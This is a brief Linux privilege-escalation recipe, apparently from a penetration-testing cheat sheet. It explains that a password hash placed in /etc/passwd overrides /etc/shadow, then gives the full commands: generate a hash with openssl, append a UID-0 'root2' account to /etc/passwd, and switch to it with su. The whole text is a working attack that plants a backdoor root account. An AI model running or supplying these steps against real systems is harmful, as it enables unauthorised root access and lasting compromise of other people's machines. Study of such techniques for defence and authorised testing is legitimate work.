For backwards compatibility, if a password hash is present in the second column of an /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow, if available. This means that if we can write into /etc/passwd, we can effectively set an arbitrary password for any account.

Generate password hash:
```
openssl passwd w00t
```
Add new password:
```
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```
Switch to new account, root2:
```
su root2
```
